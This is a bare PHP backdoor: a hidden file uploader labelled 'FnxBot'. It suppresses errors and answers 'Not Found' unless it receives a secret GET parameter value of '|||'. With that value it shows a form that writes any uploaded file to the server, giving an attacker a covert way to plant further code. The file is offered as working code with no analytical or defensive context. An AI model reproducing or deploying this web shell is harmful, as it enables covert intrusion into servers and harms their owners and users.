<?php
error_reporting(0);
$systemx = $_GET["Fnx"];
if ($systemx == "|||") {
    echo '<h1>FnxBot</h1>';
    echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
    echo '<input type="file" name="file" size="50"><input name="Fnx" type="submit" id="_upl" value="Upload"></form>';
    if( $_POST['Fnx'] == "Upload" ) {
    if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Uploaded<b><br><br>'; }
    else { echo '<b>Not Uploaded</b><br><br>'; }
    }
} else {
    echo "Not Found";
}
?>
